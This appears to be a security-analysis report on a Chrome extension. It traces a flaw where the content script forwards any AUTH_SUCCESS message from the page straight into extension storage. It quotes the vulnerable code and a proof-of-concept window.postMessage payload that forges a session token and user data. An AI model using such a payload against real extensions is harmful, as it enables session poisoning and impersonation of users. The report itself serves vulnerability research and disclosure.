# CoCo Analysis: pkadpmpgckenobmdienapcnoggmcbihi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (multiple instances)

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pkadpmpgckenobmdienapcnoggmcbihi/opgen_generated_files/cs_1.js
Line 467	e
Line 467	e.data
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pkadpmpgckenobmdienapcnoggmcbihi/opgen_generated_files/bg.js
Line 965	t.userData
Line 965	n({},e,t)

**Code:**

```javascript
// Content script - authSuccess.bundle.js (cs_1.js line 467)
window.addEventListener("message", (function(e) {
    "AUTH_SUCCESS" === e.data.type ?
        chrome.runtime.sendMessage(e.data, (function(e) { // ← attacker-controlled from webpage
            chrome.runtime.lastError ||
            chrome.runtime.sendMessage({action: "closeAuthTab"})
        })) :
        "CLOSE_AUTH_TAB" === e.data.type &&
        chrome.runtime.sendMessage({action: "closeAuthTab"}, (function(e){}))
}))

// Background script (bg.js line 965)
const SESSION_TOKEN_KEY = "viz_session_token";
const USER_DATA_KEY = "viz_user_data";

function s(sessionId, expiresIn, openerId, userData, cookies) { // ← Called with attacker data
    try {
        // Store session token
        chrome.storage.sync.set({
            [SESSION_TOKEN_KEY]: {token: sessionId, expiresAt: expiresAt}
        });

        // Store user data
        chrome.storage.sync.set({
            [USER_DATA_KEY]: userData // ← Attacker-controlled userData stored
        });

        chrome.tabs.query({}, (function(t) {
            t.forEach((function(t) {
                chrome.tabs.sendMessage(t.id, {action: "loginComplete"})
            }))
        }))
    } catch(t) {}
}

chrome.runtime.onMessage.addListener((function(t, e, r) {
    try {
        if ("AUTH_SUCCESS" === t.type) { // ← Receives message from content script
            s(t.sessionId, t.expiresIn, t.openerId, t.userData, t.cookies); // ← All attacker-controlled
            r({received: !0});
            chrome.tabs.query({}, (function(t) {
                t.forEach((function(t) {
                    chrome.tabs.sendMessage(t.id, {action: "loginComplete"})
                }))
            }))
        }
    } catch(t) {}
    return !0
}))
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// On https://www.vizolv.com/* (matches in manifest content_scripts)
// Attacker controls the webpage and sends malicious data
window.postMessage({
    type: "AUTH_SUCCESS",
    sessionId: "malicious_session_id",
    expiresIn: 999999,
    openerId: "attacker_opener",
    userData: {
        email: "attacker@evil.com",
        name: "Attacker",
        maliciousData: "payload"
    },
    cookies: "malicious_cookies"
}, "*");
```

**Impact:** Attacker can poison chrome.storage.sync with arbitrary userData. The webpage at vizolv.com can inject malicious authentication data into the extension's storage, potentially allowing the attacker to impersonate users or inject malicious payloads that may be used by the extension in subsequent operations.
